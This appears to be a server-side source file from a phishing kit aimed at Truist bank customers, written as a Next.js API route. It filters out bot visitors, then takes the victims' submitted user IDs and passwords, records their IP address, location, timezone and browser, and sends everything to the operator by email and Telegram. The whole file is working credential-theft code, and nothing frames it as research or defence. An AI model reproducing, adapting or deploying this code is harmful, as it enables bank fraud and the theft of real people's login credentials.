import geoip from "geoip-lite";
import MobileDetect from "mobile-detect";
import nextConnect from "next-connect";
import { NextApiRequest, NextApiResponse } from "next";
import middleware from "../../middleware/middleware";
import { sendEmail } from "../../utils/sendEmail";
import { sendTelegram } from "../../utils/sendTelegram";

interface ExtendedRequest extends NextApiRequest {
  files: any;
}

const handler = nextConnect();
handler.use(middleware);

handler.post(async (req: ExtendedRequest, res: NextApiResponse) => {
  const md = new MobileDetect(req.headers[`user-agent`] as string);
  const isBot = md.is(`Bot`);
  if (isBot) {
    res.end(`Fuck off`);
    return;
  }

  try {
    const ip = req.headers[`x-forwarded-for`] || req.connection.remoteAddress;
    const geo = geoip.lookup(ip as string | number);

    // const values = JSON.parse(Object.keys(req.body as any)[0]);

    const values = req.body;
    const message = `
<div>⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄BEGIN⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄</div>
${
  values.form[0] === `LOGIN DETAILS` &&
  ` <br>
<h4>LOGIN DETAILS</h4>
<p>| (▰˘◡˘▰) LOGIN ATTEMPT ☞ <b>${
    JSON.parse(values.loginDetails).loginAttempt
  }</b></p>
<p>| (▰˘◡˘▰) USER ID ☞ <b>${JSON.parse(values.loginDetails).userId}</b></p>
<p>| (▰˘◡˘▰) PASSWORD ☞ <b>${JSON.parse(values.loginDetails).password}</b></p>
<br>
<div>⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄</div>
<br>
<p>| (▰˘◡˘▰) IP ☞ <b>${ip}</b></p>
<p>| (▰˘◡˘▰) LOCATION ☞ <b>${geo?.city}, ${geo?.country}</b></p>
<p>| (▰˘◡˘▰) TIMEZONE ☞ <b>${geo?.timezone}</b></p>
<p>| (▰˘◡˘▰) USER AGENT ☞ <b>${req.headers[`user-agent`]}</b></p>
<br>
<div>⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄END⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄⑀⑄</div>`
}`;

    if (process.env.TO) {
      await sendEmail(
        message,
        `TRUIST - ${values.form} by ROCKET 🚀🚀🚀 From ${ip}`
      );
    }

    if (process.env.TELEGRAM_ID) {
      await sendTelegram({
        message: `
        TRUIST - ${values.form} by ROCKET 🚀🚀🚀 From ${ip}
        ${message}
      `,
      });
    }

    res.send(Promise.resolve());
  } catch (error) {
    res.status(500).send({
      name: `Something went wrong`,
    });
  }
});

export const config = {
  api: {
    bodyParser: false,
  },
};

export default handler;
